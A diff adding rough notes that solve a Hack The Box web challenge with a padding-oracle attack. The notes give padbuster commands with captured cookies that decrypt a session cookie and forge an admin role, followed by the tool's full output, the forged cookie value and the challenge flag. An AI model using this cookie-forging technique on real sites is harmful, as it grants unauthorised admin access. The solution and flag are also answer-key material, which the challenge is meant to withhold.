@@ -1,0 +1,150 @@
+docker.hackthebox.eu:30858
+
+ Can you get to the profile page of the admin? 
+ 
+ coockie :_ga=GA1.2.2062694247.1580485611; __auc=aed6567016ffc58eff23264981d; ajs_user_id=%22ee97d1eca1858fbc086a3f3df362c82b%22; ajs_group_id=null; ajs_anonymous_id=%220a2cdcbe-d516-41e4-aa66-2d4f73a88811%22; PHPSESSID=une63o1rn1h3fj131noaps3qq5; iknowmag1k=zBxS62hDRQS4kcxLrtMPq2Gm4qk%2BxU373LO4h8N3hcrTFx3AKIJ10g%3D%3D
+ 
+ PHPSESSID=une63o1rn1h3fj131noaps3qq5
+ iknowmag1k=zBxS62hDRQS4kcxLrtMPq2Gm4qk%2BxU373LO4h8N3hcrTFx3AKIJ10g%3D%3D
+ 
+padding attack : https://www.securitylearn.net/tag/padbuster/
+ 
+ padbuster to decode iknowmag1k
+ 
+ padbuster url cryptedvalue blocksize --coockies your cookie
+ 
+ padbuster http://docker.hackthebox.eu:31727/profile.php zBxS62hDRQS4kcxLrtMPq2Gm4qk%2BxU373LO4h8N3hcrTFx3AKIJ10g%3D%3D 8 -cookies "_ga=GA1.2.2062694247.1580485611; __auc=aed6567016ffc58eff23264981d; ajs_user_id=%22ee97d1eca1858fbc086a3f3df362c82b%22; ajs_group_id=null; ajs_anonymous_id=%220a2cdcbe-d516-41e4-aa66-2d4f73a88811%22; PHPSESSID=une63o1rn1h3fj131noaps3qq5; iknowmag1k=zBxS62hDRQS4kcxLrtMPq2Gm4qk%2BxU373LO4h8N3hcrTFx3AKIJ10g%3D%3D"
+ 
+output : {"user":"hasky","role":"admin"}
+ 
+ 
+ change role ::
+ 
+padbuster http://docker.hackthebox.eu:30858/profile.php zBxS62hDRQS4kcxLrtMPq2Gm4qk%2BxU373LO4h8N3hcrTFx3AKIJ10g%3D%3D 8 -cookies "_ga=GA1.2.2062694247.1580485611; __auc=aed6567016ffc58eff23264981d; ajs_user_id=%22ee97d1eca1858fbc086a3f3df362c82b%22; ajs_group_id=null; ajs_anonymous_id=%220a2cdcbe-d516-41e4-aa66-2d4f73a88811%22; PHPSESSID=une63o1rn1h3fj131noaps3qq5; iknowmag1k=zBxS62hDRQS4kcxLrtMPq2Gm4qk%2BxU373LO4h8N3hcrTFx3AKIJ10g%3D%3D" --plaintext "{"user":"hasky","role":"admin"}"
+ 
+bypass : {\"user\":\"hasky\",\"role\":\"admin\"}
+
+padbuster http://docker.hackthebox.eu:31727/profile.php zBxS62hDRQS4kcxLrtMPq2Gm4qk%2BxU373LO4h8N3hcrTFx3AKIJ10g%3D%3D 8 -cookies "_ga=GA1.2.2062694247.1580485611; __auc=aed6567016ffc58eff23264981d; ajs_user_id=%22ee97d1eca1858fbc086a3f3df362c82b%22; ajs_group_id=null; ajs_anonymous_id=%220a2cdcbe-d516-41e4-aa66-2d4f73a88811%22; PHPSESSID=une63o1rn1h3fj131noaps3qq5; iknowmag1k=zBxS62hDRQS4kcxLrtMPq2Gm4qk%2BxU373LO4h8N3hcrTFx3AKIJ10g%3D%3D" --plaintext "{\"user\":\"hasky\",\"role\":\"admin\"}"
+
+
+
+
+ GqBQxUN1TlHYpNcJPwSTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D
+ 
+ 
+ 
+ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 
+  padbuster http://docker.hackthebox.eu:31727/profile.php zBxS62hDRQS4kcxLrtMPq2Gm4qk%2BxU373LO4h8N3hcrTFx3AKIJ10g%3D%3D 8 -cookies "_ga=GA1.2.2062694247.1580485611; __auc=aed6567016ffc58eff23264981d; ajs_user_id=%22ee97d1eca1858fbc086a3f3df362c82b%22; ajs_group_id=null; ajs_anonymous_id=%220a2cdcbe-d516-41e4-aa66-2d4f73a88811%22; PHPSESSID=une63o1rn1h3fj131noaps3qq5; iknowmag1k=zBxS62hDRQS4kcxLrtMPq2Gm4qk%2BxU373LO4h8N3hcrTFx3AKIJ10g%3D%3D" --plaintext "{\"user\":\"hasky\",\"role\":\"admin\"}"
+
++-------------------------------------------+
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+| labs@gdssecurity.com                      |
++-------------------------------------------+
+ERROR: 500 Can't connect to docker.hackthebox.eu:31727 (Connection refused)
+   Retrying in 10 seconds...
+
+ERROR: 500 Can't connect to docker.hackthebox.eu:31727 (Connection refused)
+   Retrying in 10 seconds...
+
+
+INFO: The original request returned the following
+[+] Status: 302
+[+] Location: login.php
+[+] Content Length: 67
+
+INFO: Starting PadBuster Encrypt Mode
+[+] Number of Blocks: 4
+
+INFO: No error string was provided...starting response analysis
+
+*** Response Analysis Complete ***
+
+The following response signatures were returned:
+
+-------------------------------------------------------
+ID#     Freq    Status  Length  Location
+-------------------------------------------------------
+1       1       500     67      N/A
+2       1       302     0       login.php
+3       1       500     75      N/A
+4 **    253     500     0       N/A
+-------------------------------------------------------
+
+Enter an ID that matches the error condition
+NOTE: The ID# marked with ** is recommended : 4
+
+Continuing test with selection 4
+
+[+] Success: (97/256) [Byte 8]
+[+] Success: (155/256) [Byte 7]
+[+] Success: (87/256) [Byte 6]
+[+] Success: (153/256) [Byte 5]
+[+] Success: (61/256) [Byte 4]
+[+] Success: (188/256) [Byte 3]
+[+] Success: (151/256) [Byte 2]
+[+] Success: (167/256) [Byte 1]
+
+Block 4 Results:
+[+] New Cipher Text (HEX): 300a2faf0d881a9f
+[+] Intermediate Bytes (HEX): 516e42c663aa679e
+
+[+] Success: (197/256) [Byte 8]
+[+] Success: (77/256) [Byte 7]
+[+] Success: (51/256) [Byte 6]
+[+] Success: (253/256) [Byte 5]
+[+] Success: (25/256) [Byte 4]
+[+] Success: (182/256) [Byte 3]
+ERROR: 500 Can't connect to docker.hackthebox.eu:31727 (Connection timed out)
+   Retrying in 10 seconds...
+
+[+] Success: (226/256) [Byte 2]
+[+] Success: (96/256) [Byte 1]
+
+Block 3 Results:
+[+] New Cipher Text (HEX): 8a6b238e62ec8b18
+[+] Intermediate Bytes (HEX): a8194ce207ceb13a
+
+[+] Success: (203/256) [Byte 8]
+[+] Success: (77/256) [Byte 7]
+[+] Success: (130/256) [Byte 6]
+[+] Success: (176/256) [Byte 5]
+[+] Success: (129/256) [Byte 4]
+[+] Success: (80/256) [Byte 3]
+[+] Success: (53/256) [Byte 2]
+[+] Success: (14/256) [Byte 1]
+
+Block 2 Results:
+[+] New Cipher Text (HEX): d8a4d7093f049318
+[+] Intermediate Bytes (HEX): faccb67a547db134
+
+[+] Success: (150/256) [Byte 8]
+[+] Success: (146/256) [Byte 7]
+[+] Success: (252/256) [Byte 6]
+[+] Success: (222/256) [Byte 5]
+[+] Success: (77/256) [Byte 4]
+[+] Success: (221/256) [Byte 3]
+[+] Success: (123/256) [Byte 2]
+[+] Success: (151/256) [Byte 1]
+
+Block 1 Results:
+[+] New Cipher Text (HEX): 1aa050c543754e51
+[+] Intermediate Bytes (HEX): 618225b626076c6b
+
+-------------------------------------------------------
+** Finished ***
+
+[+] Encrypted value is: GqBQxUN1TlHYpNcJPwSTGIprI45i7IsYMAovrw2IGp8AAAAAAAAAAA%3D%3D
+-------------------------------------------------------
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+chage this hash with iknow...
+
+
+
+
+HTB{Padd1NG_Or4cl3z_AR3_WaY_T0o_6en3r0ys_ArenT_tHey???}
